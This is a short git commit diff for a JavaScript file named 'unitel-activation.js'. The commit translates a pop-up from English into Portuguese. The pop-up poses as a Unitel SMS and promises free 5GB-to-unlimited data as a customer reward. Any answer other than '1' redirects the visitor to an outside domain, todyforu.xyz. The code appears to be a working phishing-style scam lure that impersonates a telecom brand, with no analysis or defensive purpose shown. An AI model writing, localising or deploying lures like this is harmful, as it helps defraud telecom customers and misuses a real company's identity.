0c9b5492460dfd2d6dda051a3ce2e94c6a92c779
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-03 05:53:14 -0700

    Update unitel-activation.js

--- unitel-activation.js
+++ unitel-activation.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('Unitel SMS: Dear customer, kindly check if your Unitel sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+password=prompt('Unitel SMS: Prezado cliente, por favor verifique se o seu cartão SIM Unitel está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
 if (password != '1') {
 location.href='https://todyforu.xyz/unitel.html';
 }
